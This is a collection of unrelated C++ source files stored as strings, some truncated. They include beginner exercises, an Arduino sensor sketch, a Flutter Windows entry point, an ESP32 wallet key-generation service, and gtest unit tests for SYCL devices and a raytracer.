    "#include <bits/stdc++.h>\nusing namespace std;\nint N;\n\nstring v = \"00000000000000000000\";\n\nvoid add(string& s, int e){\n    s[e - 1] = '1';\n}\nvoid remove(string& s, int e){\n    s[e - 1] = '0';\n}\n\n\nvoid check(string& s, int e){\n    cout << s[e-1] - '0' << \"\\n\";\n}\n\nvoid toggle(string& s, int e){\n    if(s[e-1] == '1'){\n        s[e-1] = '0';\n    }else{\n        s[e-1] = '1';\n    }\n}\nvoid all(string& s){\n    s = \"11111111111111111111\";\n}\n\nvoid empty(string& s){\n    s = \"00000000000000000000\";\n}\n\nint main(){\n    cin.tie(NULL);\n    ios_base::sync_with_stdio(false);\n    string s;\n    int e;\n    cin >> N;\n    for(int i = 0; i < N; i++){\n        cin >> s;\n\n        if(s == \"add\") {\n            cin >> e;\n            add(v, e);\n            // cout << v << \"\\n\";\n            }\n        else if(s == \"remove\"){\n            cin >> e;\n            remove(v, e);\n            // cout << v << \"\\n\";\n        }\n        else if(s == \"check\") {\n            cin >> e;\n            check(v, e);\n            // cout << v << \"\\n\";\n            }\n        else if(s == \"toggle\") {\n            cin >> e;\n            toggle(v, e);\n            // cout << v << \"\\n\";\n        }\n        else if(s == \"all\") {\n            all(v);\n            // cout << v << \"\\n\";\n            }\n        else if(s == \"empty\") {\n            empty(v);\n            // cout << v << \"\\n\";\n        }\n    }\n    return 0;\n}",
    "#include <Arduino.h>\n#include <Adafruit_Sensor.h>\n#include <DHT.h>\n#include \"WiFiS3.h\"\n#include \"Arduino_LED_Matrix.h\"\n#include \"ArduinoGraphics.h\"\n\nArduinoLEDMatrix matrix;\n\n#define DHT_pin 2\n#define DHT_type DHT11\n#define red_pin 9\n#define green_pin 10\n#define blue_pin 11\n\n\nDHT dht(DHT_pin, DHT_type);\n\n\n\nstruct TempHumidity {\n    float temperature{};\n    float humidity{};\n    String status;\n};\n\nfloat manualTemperature = NAN; // Initialize to NAN\n\nTempHumidity readTemperatureAndHumidity() {\n    TempHumidity data;\n    data.humidity = dht.readHumidity();\n    data.temperature = isnan(manualTemperature) ? dht.readTemperature() : manualTemperature; // If the manual temp is not set, read from the sensor\n\n    // Check if any reading failed\n    if (isnan(data.humidity) || isnan(data.temperature)) {\n        data.humidity = -1;     // Use -1 to indicate an error\n        data.temperature = -1;  // Use -1 to indicate an error\n        data.status = \"ERROR\";\n    }\n\n    if (data.temperature < 18)\n    {\n        // Low temp\n        data.status = \"LOW\";\n    }else if (data.temperature > 18.0 && data.temperature < 27.0)\n    {\n        // Good temp\n        data.status = \"OK\";\n    } else if (data.temperature > 27.0)\n    {\n        // High temp\n        data.status = \"HIGH\";\n    }\n\n    return data;\n}\n\n// Function to convert float to byte array\nvoid floatToBytes(const float value, uint8_t *bytes) {\n    memcpy(bytes, &value, sizeof(value));\n}\n\nvoid displayText(const char* text) {\n    matrix.clear();\n    matrix.beginDraw();\n    matrix.stroke(0xFFFFFFFF);\n    matrix.textFont(Font_5x7);\n    matrix.beginText(0, 1, 0xFFFFFF);\n    matrix.println(text);\n    matrix.endText();\n    matrix.endDraw();\n}\n\nvoid handleSerialInput()\n{\n    if (Serial.available() > 0) {\n        if (const String input = Serial.readStringUntil('\\n'); input.startsWith(\"temp\")) {\n            if (input.substring(5)) {\n                manualTemperature = input.substring(5).toFloat();\n            }\n        } else if (input.startsWith(\"DHT\")) {\n            manualTemperature = NAN;\n\n        }\n    }\n}\n\nvoid setup() {\n    Serial.begin(9600);\n    matrix.begin();\n    matrix.beginDraw();\n    pinMode(red_pin, OUTPUT);\n    pinMode(green_pin, OUTPUT);\n    pinMode(blue_pin, OUTPUT);\n    dht.begin();\n    // Sleep for 2 seconds to allow the sensor to stabilize\n    delay(2000);\n}\n\nvoid loop() {\n    handleSerialInput();\n\n\n    if (auto [temperature, humidity, status] = readTemperatureAndHumidity(); humidity == -1 || temperature == -1) {\n        Serial.println(\"{'temperature': 'fail', 'humidity': 'fail', 'status': 'ERROR'}\");\n\n    } else {\n        const String tempString = \"{\\\"temperature\\\":\" + String(temperature) + \", \\\"humidity\\\":\" + String(humidity) + R\"(, \"status\":\")\" + String(status) + \"\\\"}\\n\";\n        Serial.println(tempString);\n\n        if (status == \"LOW\")\n        {\n            // Blue\n            analogWrite(red_pin, 255);\n            analogWrite(green_pin, 255);\n            analogWrite(blue_pin, 0);\n        } else if (status == \"OK\")\n        {\n            // Green\n            analogWrite(red_pin, 255);\n            analogWrite(green_pin, 0);\n            analogWrite(blue_pin, 255);\n        } else if (status == \"HIGH\" || status == \"ERROR\")\n        {\n            // Red\n            analogWrite(red_pin, 0);\n            analogWrite(green_pin, 255);\n            analogWrite(blue_pin, 255);\n        }\n\n        char tempBuffer[8];\n        dtostrf(temperature, 0, 0, tempBuffer);\n\n        displayText(tempBuffer);\n\n    }\n\n    delay(10); // Wait 10 milliseconds\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"whatsapp_clone\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"CryptoService.h\"\n#include \"mbedtls/sha256.h\"\n#undef PSTR // conflict\n#undef F\n#include <cryptopp/ripemd.h>\n#include <cstring>\n#include <algorithm>\n#include \"bootloader_random.h\"\n#include \"esp_random.h\"\n#include \"mbedtls/ctr_drbg.h\"\n#include \"mbedtls/entropy.h\"\n#include \"mbedtls/pkcs5.h\"\n#include \"cryptopp/rng.h\"\n\nnamespace services {\n\nCryptoService::CryptoService() {}\n\nstd::vector<uint8_t> CryptoService::generateRandomMbetls(size_t size) {\n    // Init context\n    mbedtls_ctr_drbg_context ctr_drbg;\n    mbedtls_entropy_context entropy;\n    mbedtls_ctr_drbg_init(&ctr_drbg);\n    mbedtls_entropy_init(&entropy);\n\n    // Seed the DRBG\n    auto pers = getRandomString(32); // length of the string\n    mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy,\n                          reinterpret_cast<const unsigned char*>(pers.c_str()),\n                          pers.length());\n\n    // Get random\n    std::vector<uint8_t> randomData(size);\n    mbedtls_ctr_drbg_random(&ctr_drbg, randomData.data(), size);\n\n    // Release context\n    mbedtls_ctr_drbg_free(&ctr_drbg);\n    mbedtls_entropy_free(&entropy);\n\n    return randomData;\n}\n\nstd::vector<uint8_t> CryptoService::generateRandomEsp32(size_t size) {\n    // Get entropy from esp32 HRNG\n    std::vector<uint8_t> randomData(size);\n    bootloader_random_enable();\n    esp_fill_random(randomData.data(), randomData.size());\n    bootloader_random_disable();\n    \n    return randomData;\n}\n\nstd::vector<uint8_t> CryptoService::generateRandomBuiltin(size_t size) {\n    // Builtin esp_random\n    std::vector<uint8_t> randomData(size);\n    size_t i = 0;\n\n    while (i < size) {\n        // 32 bits integer\n        uint32_t randVal = esp_random();\n\n        // Split randVal into 4 parts\n        size_t bytesToCopy = std::min(size - i, static_cast<size_t>(4));\n        memcpy(randomData.data() + i, &randVal, bytesToCopy);\n\n        i += bytesToCopy;\n    }\n\n    return randomData;\n}\n\nstd::string CryptoService::getRandomString(size_t length) {\n    auto randomData = generateRandomEsp32(length);\n    std::string randomString(randomData.begin(), randomData.end());\n\n    return randomString;\n}\n\nstd::vector<uint8_t> CryptoService::generatePrivateKey(size_t keySize) {\n    // Get entropy from hardware and software\n    auto entropyEsp32 = generateRandomEsp32(keySize);\n    auto entropyMbedtls = generateRandomMbetls(keySize);\n    auto entropyBuiltin = generateRandomBuiltin(keySize);\n\n    // Get entropy from user action\n    auto entropyUser = entropyContext.getAccumulatedEntropy();\n\n    // Control size\n    if (entropyEsp32.size() != keySize || entropyMbedtls.size() != keySize || entropyBuiltin.size() != keySize) {\n        throw std::runtime_error(\"Failed to generate sufficient entropy\");\n    }\n\n    // Process SHA256 on the user entropy\n    auto hashedEntropyUser = hashSha256(entropyUser, keySize);\n\n    // Mix entropy with XOR\n    auto mixedKey = mixEntropy(entropyMbedtls, entropyEsp32, \n                                               entropyBuiltin, hashedEntropyUser);\n    // Process SHA256 on the result\n    auto privateKey = hashSha256(mixedKey, keySize);\n\n    return privateKey;\n}\n\nstd::vector<std::string> CryptoService::privateKeyToMnemonic(const std::vector<uint8_t>& privateKey) {\n    // Convert a private key into a vector of words\n    auto entropy = std::vector<uint8_t>(privateKey.begin(), privateKey.end());\n    auto mnemonic = BIP39::create_mnemonic(entropy, BIP39::language::en);\n    auto validation = BIP39::valid_mnemonic(mnemonic, BIP39::language::en);\n    if (!validation) {return {};}\n\n    return {mnemonic.begin(), mnemonic.end()};;\n}\n\nstd::string CryptoService::mnemonicVectorToString(std::vector<std::string> mnemonic) {\n    std::ostringstream oss;\n    for (auto it = mnemonic.begin(); it != mnemonic.end(); ++it) {\n        if (it != mnemonic.begin()) {\n            oss << \" \";\n        }\n        oss << *it;\n    }\n\n    return oss.str();\n}\n\nBIP39::word_list CryptoService::mnemonicStringToWordList(const std::string& mnemonicStr) {\n    BIP39::word_list wordList;\n\n    if (mnemonicStr.empty()) {\n        return wordList;\n    }\n\n    // Split the string by whitespace into tokens, then add each token to the word_list\n    std::istringstream iss(mnemonicStr);\n    for (std::string token; iss >> token; ) {\n        wordList.add(token);\n    }\n\n    return wordList;\n}\n\nstd::vector<uint8_t> CryptoService::mnemonicToPrivateKey(const std::string& mnemonic) {\n    // Buffer big enough\n    uint8_t buffer[64] = {0};\n\n    // The function returns how many bytes were actually written.\n    size_t written = mnemonicToEntropy(\n        mnemonic.c_str(),         // The mnemonic words\n        mnemonic.size(),          // Length of that string\n        buffer,                   // Output buffer\n        sizeof(buffer)            // Buffer size\n    );\n\n    return std::vector<uint8_t>(buffer, buffer + written);\n}\n\nbool CryptoService::verifyMnemonic(BIP39::word_list mnemonic) {\n    return BIP39::valid_mnemonic(mnemonic, BIP39::langua",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n//double linked list declaration\r\nstruct UserData{\r\n    string name, username, email, password;\r\n    UserData *prev, *next;\r\n\r\n};\r\n\r\nUserData *head, *tail, *cur, *newNode, *del, *afterNode;\r\n\r\nvoid CreateDoubleLinkedList(string data[4]){\r\n    head = new UserData;\r\n    head->name = data[0];\r\n    head->username = data[1];\r\n    head->email = data[2];\r\n    head->password = data[3];\r\n    head->prev = NULL;\r\n    head->next = NULL;\r\n    tail = head;\r\n}\r\n\r\n\r\nint CountDoubleLinkedList(){\r\n    if(head == NULL){\r\n        cout << \"theres no data created\" << endl;\r\n    }\r\n    else {\r\n        cur = head;\r\n        int total = 0;\r\n        while(cur != NULL){\r\n           total++;\r\n           cur = cur->next;\r\n        }\r\n    return total;\r\n    }\r\n}\r\n\r\nvoid addFirst(string data[4]){\r\n     if(head == NULL){\r\n        cout << \"theres no data created\" << endl;\r\n    }\r\n    else {\r\n        newNode = new UserData;\r\n        newNode->name = data[0];\r\n        newNode->username = data[1];\r\n        newNode->email = data[2];\r\n        newNode->password = data[3];\r\n\r\n        //stepping\r\n        //link the first node that u already create, to the newNode and vice versa\r\n        //newNode <=> first node <=> next node\r\n\r\n        newNode->prev = NULL;\r\n        newNode->next = head;\r\n        head->prev = newNode;\r\n        head = newNode;\r\n    }\r\n}\r\n\r\n\r\nvoid addLast(string data[4]){\r\n     if(head == NULL){\r\n        cout << \"theres no data created\" << endl;\r\n    }\r\n    else {\r\n        newNode = new UserData;\r\n        newNode->name = data[0];\r\n        newNode->username = data[1];\r\n        newNode->email = data[2];\r\n        newNode->password = data[3];\r\n\r\n        //stepping\r\n        //link the first node that u already create, to the newNode and vice versa\r\n        // first node <=> next node <=> newNode\r\n\r\n        newNode->prev = tail;\r\n        newNode->next = NULL;\r\n        tail->next = newNode;\r\n        tail = newNode;\r\n    }\r\n}\r\n\r\nvoid addMiddle(string data[4], int position){\r\n     if(position == 1){\r\n        cout << \"Cant insert node\" << endl;\r\n        cout << \"1st position is not in the middle\" << endl;\r\n        cout << endl;\r\n    }\r\n    else if(position > CountDoubleLinkedList()){\r\n        cout << \"Cant insert node\" << endl;\r\n        cout << \"Position is out of range\"<< endl;\r\n        cout << endl;\r\n    }\r\n    else {\r\n        newNode = new UserData;\r\n        newNode->name = data[0];\r\n        newNode->username = data[1];\r\n        newNode->email = data[2];\r\n        newNode->password = data[3];\r\n\r\n        //transverse - find the current(before the position)\r\n        cur = head;\r\n        int num = 1;\r\n        while(num < position-1 ){\r\n            cur = cur->next;\r\n            num++;\r\n        }\r\n\r\n        //stepping\r\n        afterNode = cur->next;\r\n        newNode->prev = cur;\r\n        newNode->next = afterNode;\r\n\r\n        cur->next = newNode;\r\n        afterNode->prev = newNode;\r\n\r\n\r\n    }\r\n}\r\n\r\nvoid RemoveMiddle(int position){\r\n    if(head == NULL){\r\n        cout << \"theres no data created\" << endl;\r\n    }\r\n    else {\r\n        if(position == 1 || position == CountDoubleLinkedList()){\r\n            cout << \"cant remove node!\" << endl;\r\n            cout << \"data is not in the middle\" << endl;\r\n        } else if(position < 1 || position > CountDoubleLinkedList()){\r\n            cout << \"cant remove node!\" << endl;\r\n            cout << \"data is out of range\" << endl;\r\n        } else{\r\n            //transverse\r\n            int num = 1;\r\n            cur = head;\r\n            while(num < position -1){\r\n                cur = cur->next;\r\n                num++;\r\n            }\r\n            del = cur->next;\r\n            afterNode = del->next;\r\n\r\n            cur->next = afterNode;\r\n            afterNode->prev = cur;\r\n            delete del;\r\n\r\n        }\r\n\r\n     }\r\n}\r\nvoid PrintDoubleLinkedList(){\r\n\r\n    if(head == NULL){\r\n        cout << \"theres no data created\" << endl;\r\n    }\r\n    else {\r\n        cout << \"Total Data = \" << CountDoubleLinkedList() << endl;\r\n        UserData *cur;\r\n        cur = head;\r\n\r\n        while(cur != NULL){\r\n        cout << \"name     = \" << cur->name << endl;\r\n        cout << \"username = \" << cur->username << endl;\r\n        cout << \"email    = \" << cur->email << endl;\r\n        cout << \"password = \" << cur->password << endl;\r\n        cout << endl;\r\n\r\n        //step : after the print the current, the pointer will move to the next node\r\n        cur = cur->next;\r\n        }\r\n    }\r\n}\r\n\r\nint main(){\r\n\r\n    string newData[4] = {\"stevany\",\"stevany&alia\",\"stevany@gmail.com\",\"alia123\"};\r\n    CreateDoubleLinkedList(newData);\r\n\r\n    string data2[4] = {\"alia\",\"alia&stevany\",\"alia@gmail.com\",\"stevany123\"};\r\n    addFirst(data2);\r\n\r\n    string data3[4] = {\"dinda\",\"alia&dinda\",\"dinda@gmail.com\",\"dinda123\"};\r\n    addLast(data3);\r\n\r\n    string data4[4] = {\"gressce\",\"gressce&alia\",\"gressce@gmail.com\",\"gressce123\"};\r\n    addMiddle(data4,1);\r\n\r\n    RemoveMiddle(2);\r\n\r\n    PrintDoubleLinkedList();\r\n//print\r\n}\r\n",
    "#include<iostream>\r\n#include<fstream>\r\n#include<string.h>\r\n#include<cstdlib>\r\n#include<string>\r\nusing namespace std;\r\n \r\nvoid studentInfo();     void updateStudInfo();     void deleteStudInfo();\r\nvoid courseResult();    void updateResult();       void deleteResult();\r\n\r\nvoid studentLogin();\t  void teacherLogin();      void registrarLogin();\r\nvoid depttChoice();        void gradeReport();\r\n\r\nstruct dept  { char dpt[30]; };\r\nstruct isCourses\r\n\t\t{\r\n\t\t\tfloat cpp, acc, math, eco, is, stat, incl;\r\n\t\t};\r\nstruct itCourses\r\n\t\t{\r\n\t\t\tfloat cpp, db, coa, elic, gt, stat, incl;\r\n\t\t};\t\t\r\nstruct csCourses\r\n\t\t{\r\n\t\t\tfloat cpp, db, alg, eco, gt, stat, incl;\r\n\t\t};\r\nstruct student\r\n\t{   char prog[30];      char idno[10];\r\n\t    char age[3];        char f_name[25];\r\n\t\tchar l_name[25];    char sex[10];\r\n\t\tstruct isCourses s;    struct itCourses t;\r\n\t\tstruct csCourses c;    struct dept d1;\r\n\t\t};\r\n\r\nint main (){\r\nsystem(\"color 5B\");\t\r\nint choice, deptChoice;   string tpassword, spassword, rpassword;\r\nouterloop:\r\nsystem(\"cls\");\t\r\ncout<<\"\\t\\t\\t\\t      HAWASSA UNIVERSITY\"<<endl;\r\ncout<<\"\\t\\t\\t\\t   INSTITUTE  OF TECHNOLOGY\"<<endl;\r\ncout<<\"\\t\\t\\t\\t    FACULTY OF INFORMATICS\"<<endl;\r\ncout<<\"===============================================================================================================\"<<endl;\r\ncout<<\" \\t\\t\\t\\tStudent Grade Reporting System\"<<endl;\r\ncout<<\"===============================================================================================================\"<<endl;\r\ncout<<\"\\n\\t\\t 1. STUDNET LOGIN\"<< \"\\t 2. TEACHER LOGIN\"  << \"\\t 3. REGISTRAR LOGIN\"<<endl;\r\ncout<<\"\\n\\t\\t  :\"; cin>>choice;\r\n \r\n switch(choice){\r\n \t\r\n    case 1:  retry1: \r\n \t\t   cout<<\"\\n\\n\\tENTER PASSWORD: \";\tcin>>spassword;\r\n \t    if(spassword==\"1234\")      { studentLogin();}\r\n\t    else    {cout<<\"\\n\\tINVALID PASSWORD. Please Try Again...\";\r\n        goto retry1; }   break;\r\n\tcase 2: retry2:  system(\"cls\");\r\n \t\t      cout<<\"\\n\\n\\tENTER PASSWORD: \";   cin>>tpassword;\r\n     \tif(tpassword==\"4321\")     { teacherLogin();\t}\r\n        else       {cout<<\"\\n\\tINVALID PASSWORD. Please Try Again...\";\r\n \t    goto retry2; }   break;\r\n\t  case 3: retry3: \r\n \t\t     cout<<\"\\n\\n\\tENTER PASSWORD: \";   cin>>rpassword;\r\n     \tif(rpassword==\"0102\")      {registrarLogin(); }\r\n        else    {cout<<\"\\n\\tINVALID PASSWORD. Please Try Again...\";\r\n \t    goto retry3; }  break;\r\n\t  \r\n\tdefault:  system(\"cls\");   cout<<\" \\n\\n\\tINVALID CHOICE, PLEASE TRY AGIAN \"<<endl;  break;\r\n }\r\n  char ny;\r\n  cout<<\"\\n\\tDo You Want to Return to the Main Menu? Press 'y' for Yes or 'n' for No : \"; cin>>ny;\r\n if(ny =='y'|| ny =='Y') { goto outerloop;}\r\n  else exit(0);\r\n \r\n return 0; \r\n}\r\n \r\n void depttChoice()\r\n {\r\n  struct dept d1;     ofstream studDeptFile;\r\n\tstudDeptFile.open(\"studDeptFile.txt\",ios::out);\r\nint deptChoice;\r\ncout<<\"*******************CHOOSE DEPARTMENT******************\"<<endl;\r\n\tcout<<\"------------------------------------------------------\"<<endl;\t\r\n\tcout<<\"\\n   1.Information System\"<<endl;\r\n\tcout<<\"\\n   2.Information Technology\"<<endl;\r\n\tcout<<\"\\n   3.Computer Science\"<<endl;\r\n\tcout<<\"     :\";cin>>deptChoice;   \r\nchar dtChoice [40];\r\n   switch(deptChoice)\r\n\t{\r\n\tcase 1:\tsystem(\"cls\");  strcpy (d1.dpt, \"Information_System\"); cout<<endl;\r\n\t    cout<<\"\\t\\t**************************************************\"<<endl;\t\r\n\t\tcout<<\"\\t\\t\\tDEPARTMENT OF INFORMATION SYSTEM\"<<endl;\r\n\t\tcout<<\"\\t\\t**************************************************\"<<endl;\t\r\n\t\tbreak;\r\n\tcase 2: system(\"cls\");\tstrcpy (d1.dpt, \"Information_Technology\");  cout<<endl;\r\n\t    cout<<\"\\t*****************************************************\"<<endl;\t\r\n\t\tcout<<\"\\t\\tDEPARTMENT OF INFORMATION TECHNOLOGY\"<<endl;\r\n\t\t cout<<\"\\t****************************************************\"<<endl;\t\r\n\t\tbreak;\r\n\tcase 3:  system(\"cls\");  strcpy (d1.dpt, \"Computer_Science\");\tcout<<endl;\r\n\t\tcout<<\"\\t*************************************************\"<<endl;\t\r\n\t\tcout<<\"\\t\\tDEPARTMENT OF COMPUTER SCIENCE\"<<endl;\r\n\t\tcout<<\"\\t*************************************************\"<<endl;\t\r\n\t\tbreak;\r\n\tdefault:\tsystem(\"cls\");  cout<<\"Invalid Choice\";\r\n    }\r\n\tstudDeptFile <<d1.dpt<<endl;        studDeptFile.close();\r\n}\r\n\r\n\r\n\r\nvoid studentLogin(){\r\nloops:  system(\"cls\");\r\nint choice;\r\ncout<<\"\\n\\t\\t1. Display Grade Report\"<<endl;\t\r\ncout<<\"\\n\\t\\t2. Exit\"<<endl;   cout<<\"\\t\\t   :\";cin>> choice;\r\n\r\nswitch(choice){\r\n\tcase 1:  system(\"cls\");  gradeReport();  break;\r\n\tcase 2:  exit(0);  break;\r\n\tdefault:  cout<<\" \\n\\n\\tINVALID CHOICE, PLEASE TRY AGIAN \"<<endl;  \r\n    goto loops;\r\n    }\r\n  char yn; \r\n  cout<<\"\\n\\tDo You Want to Return to the STUDENT MENU? Press 'y' for Yes or 'n' for No : \"; cin>>yn;\r\n  if(yn =='y'|| yn =='Y')  { goto loops;}  else exit(0);\r\n}\r\n\r\n\r\n\r\nvoid teacherLogin(){\r\nloopt:  system(\"cls\");\r\nint choice;\r\ncout<<\"\\n\\n\\t\\tPlease Choose from the following Options\"<<endl;\r\ncout<<\"\\n\\t\\t1.Register Students Course Results\"<<endl;    cout<<\"\\n\\t\\t2.Update Students Course Results\"<<endl;\r\ncout<<\"\\n\\t\\t3.Delete Students Course Results\"<<endl;      cout<<\"\\n\\t",
    "#include \"fiya-recorder.h\"\n\n/** You will need to define this function in your code. It must return a thread_local\n *  object in multithreaded program; otherwise it can create race conditions.\n */\nextern fiya::scoping_interface_t<void*> * get_recorder();\n\n/** Once cyg profiling starts, we set this flag to true.\n *  This is becase we want to avoid recursive calls to __cyg_profile-* \n *  functions.\n */\nstatic thread_local bool cyg_profiling_ongoing = false;\n\nextern \"C\" {\n\n/** These two functons get called everytime you enter a function, if -finstrument-functions\n *  is passed at the compile line.\n */\nvoid __cyg_profile_func_enter (void *, void *) __attribute__((no_instrument_function));\nvoid __cyg_profile_func_exit (void *, void *) __attribute__((no_instrument_function));\n\nvoid __cyg_profile_func_enter(void *this_fn, void *call_site) {\n    if (!cyg_profiling_ongoing) {\n        cyg_profiling_ongoing = true;\n        fiya::scoping_interface_t<void*> * my_recorder = get_recorder();\n        if (my_recorder && !my_recorder->recorder_internal_running()) {\n            my_recorder->begin_scope(this_fn);\n        }\n        cyg_profiling_ongoing = false;\n    }\n}\n\nvoid __cyg_profile_func_exit(void *this_fn, void *call_site) {\n    if (!cyg_profiling_ongoing) {\n        cyg_profiling_ongoing = true;\n        fiya::scoping_interface_t<void*> * my_recorder = get_recorder();\n        if (my_recorder && !my_recorder->recorder_internal_running()) {\n            my_recorder->end_scope(this_fn);\n        }\n        cyg_profiling_ongoing = false;\n    }\n}\n\n}",
    "///////////////////////////////////////////////////////////////////////\n// This file is part of the PySYCL software for SYCL development in\n// Python. It is licensed under the Apache License, Version 2.0. A copy\n// of this license, in a file named LICENSE.md, should have been\n// distributed with this file. A copy of this license is also\n// currently available at \"http://www.apache.org/licenses/LICENSE-2.0\".\n\n// Unless explicitly stated, all contributions intentionally submitted\n// to this project shall also be under the terms and conditions of this\n// license, without any additional terms or conditions.\n///////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////\n// gtest\n///////////////////////////////////////////////////////////////////////\n#include <gtest/gtest.h>\n\n///////////////////////////////////////////////////////////////////////\n// stl\n///////////////////////////////////////////////////////////////////////\n#include <iostream>\n#include <sstream>\n#include <vector>\n\n///////////////////////////////////////////////////////////////////////\n// sycl\n///////////////////////////////////////////////////////////////////////\n#include <sycl/sycl.hpp>\n\n///////////////////////////////////////////////////////////////////////\n// sycl\n///////////////////////////////////////////////////////////////////////\n#include \"Device_Instance.h\"\n\n///////////////////////////////////////////////////////////////////////\n// Defining types\n///////////////////////////////////////////////////////////////////////\nusing Vector_T = std::vector<std::vector<int>>;\n\n///////////////////////////////////////////////////////////////////////\n// Device Instance Test 1 (check platform and device index)\n///////////////////////////////////////////////////////////////////////\nTEST(DeviceInstance, test1) {\n  const auto& platforms = sycl::platform::get_platforms();\n\n  for (int i = 0; i < platforms.size(); ++i) {\n    const auto& devices = platforms[i].get_devices();\n\n    for (int j = 0; j < devices.size(); ++j) {\n      auto my_device = pysycl::Device_Instance(i, j);\n      ASSERT_EQ(i, my_device.get_platform_index());\n      ASSERT_EQ(j, my_device.get_device_index());\n    }\n  }\n}\n\n///////////////////////////////////////////////////////////////////////\n// Device Instance Test 2 (check device name and vendor)\n///////////////////////////////////////////////////////////////////////\nTEST(DeviceInstance, test2) {\n  const auto& platforms = sycl::platform::get_platforms();\n\n  for (int i = 0; i < platforms.size(); ++i) {\n    const auto& devices = platforms[i].get_devices();\n\n    for (int j = 0; j < devices.size(); ++j) {\n      auto my_device = pysycl::Device_Instance(i, j);\n      auto Q = sycl::queue(devices[j]);\n      ASSERT_EQ(\n          Q.get_device().get_info<sycl::info::device::name>(),\n          my_device.name());\n      ASSERT_EQ(\n          Q.get_device().get_info<sycl::info::device::vendor>(),\n          my_device.vendor());\n    }\n  }\n}",
    "/* QUESTION:\n\nGiven an array of positive integers arr[] of size n, the task is to find second largest distinct element in the array.\n\nNote: If the second largest element does not exist, return -1.\n\nExamples:\n\nInput: arr[] = [12, 35, 1, 10, 34, 1]\nOutput: 34\nExplanation: The largest element of the array is 35 and the second largest element is 34.\n\nInput: arr[] = [10, 5, 10]\nOutput: 5\nExplanation: The largest element of the array is 10 and the second largest element is 5.\n\nInput: arr[] = [10, 10, 10]\nOutput: -1\nExplanation: The largest element of the array is 10 there is no second largest element.*/\n\n#include <iostream>\n#include <vector>\nusing namespace std;\n\nclass Solution \n{\npublic:\n    int getSecondLargest(vector<int>& arr) \n    {\n        int largest = -1, second = -1; \n        for (int num : arr) \n        {\n            if (num > largest) \n            { \n                second = largest;\n                largest = num;\n            } \n            else if (num > second && num != largest) \n            { \n                second = num;\n            }\n        }\n\n        return second; \n    }\n};\n\nint main() \n{\n    vector<int> arr = {12, 35, 1, 10, 34, 1}; \n    Solution sol;\n    cout << sol.getSecondLargest(arr) << endl; \n    return 0;\n}\n",
    "#include \"raytracing/color.h\"\n#include \"gtest/gtest.h\"\n#include <sstream>\n\n// Tests for the linear_to_gamma function\nTEST(ColorTest, LinearToGammaPositive) {\n  EXPECT_DOUBLE_EQ(linear_to_gamma(1.0), 1.0);\n  EXPECT_DOUBLE_EQ(linear_to_gamma(0.25), 0.5);\n  EXPECT_DOUBLE_EQ(linear_to_gamma(0.81), 0.9);\n}\n\nTEST(ColorTest, LinearToGammaZeroAndNegative) {\n  EXPECT_DOUBLE_EQ(linear_to_gamma(0.0), 0.0);\n  EXPECT_DOUBLE_EQ(linear_to_gamma(-1.0), 0.0);\n  EXPECT_DOUBLE_EQ(linear_to_gamma(-0.5), 0.0);\n}\n\nTEST(ColorTest, LinearToGammaFractionalValues) {\n  EXPECT_DOUBLE_EQ(linear_to_gamma(0.04), 0.2);\n  EXPECT_DOUBLE_EQ(linear_to_gamma(0.64), 0.8);\n}\n\n// Tests for the write_color function\nTEST(ColorTest, WriteColorNormalValues) {\n  color c(0.25, 0.5, 0.75); // After gamma: 0.5, ~0.7071, ~0.8660\n  std::stringstream ss;\n  write_color(ss, c);\n\n  // Expected byte values:\n  // r: sqrt(0.25) = 0.5 * 256 = 128\n  // g: sqrt(0.5) \u2248 0.7071 * 256 \u2248 181\n  // b: sqrt(0.75) \u2248 0.8660 * 256 \u2248 221\n  EXPECT_EQ(ss.str(), \"128 181 221\\n\");\n}\n\nTEST(ColorTest, WriteColorClampHighValues) {\n  color c(1.5, 2.0, 0.999); // After gamma: >1.0, >1.0, ~0.9995\n  std::stringstream ss;\n  write_color(ss, c);\n\n  // Expected byte values after clamping:\n  // r: clamp(sqrt(1.5)) => clamp(1.2247) => 0.999 * 256 \u2248 255\n  // g: clamp(sqrt(2.0)) => clamp(1.4142) => 0.999 * 256 \u2248 255\n  // b: clamp(sqrt(0.999)) => clamp(~0.9995) => 0.999 * 256 \u2248 255\n  EXPECT_EQ(ss.str(), \"255 255 255\\n\");\n}\n\nTEST(ColorTest, WriteColorClampLowValues) {\n  color c(-0.5, 0.0, 0.1); // After gamma: 0, 0, ~0.3162\n  std::stringstream ss;\n  write_color(ss, c);\n\n  // Expected byte values after clamping:\n  // r: clamp(-0.5) => 0 * 256 = 0\n  // g: clamp(0.0) => 0 * 256 = 0\n  // b: clamp(sqrt(0.1)) \u2248 0.3162 * 256 \u2248 80.8 => 80\n  EXPECT_EQ(ss.str(), \"0 0 80\\n\");\n}\n\nTEST(ColorTest, WriteColorEdgeCases) {\n  // Test maximum clamped value\n  color c(0.999, 0.999, 0.999);\n  std::stringstream ss1;\n  write_color(ss1, c);\n  EXPECT_EQ(ss1.str(), \"255 255 255\\n\");\n\n  // Test minimum clamped value\n  color c_min(0.0, 0.0, 0.0);\n  std::stringstream ss2;\n  write_color(ss2, c_min);\n  EXPECT_EQ(ss2.str(), \"0 0 0\\n\");\n}\n\nTEST(ColorTest, 